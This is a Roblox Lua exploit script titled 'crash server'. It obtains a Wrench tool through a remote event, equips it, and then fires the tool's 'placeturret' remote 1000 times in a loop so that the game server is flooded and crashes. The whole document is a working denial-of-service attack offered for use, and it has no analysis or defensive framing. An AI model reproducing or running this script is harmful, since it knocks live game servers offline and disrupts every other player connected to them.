title: crash server
features: crashes your current server using the turret tool.
script:
local player = game:GetService("Players").LocalPlayer

local Event = game:GetService("ReplicatedStorage").WeaponEvent
Event:FireServer(
    "Wrench"
)

task.wait(0.25)

local wrench = player.Backpack:FindFirstChild("Wrench")

if wrench then
	wrench.Parent = player.Character
else
	warn("wrench not found (?)")
end

task.wait(0.025)

for i = 1, 1000 do
    local Event = game:GetService("Players").LocalPlayer.Character.Wrench.placeturret
    Event:FireServer(
        game:GetService("Players").LocalPlayer.Character.Wrench
    )
end
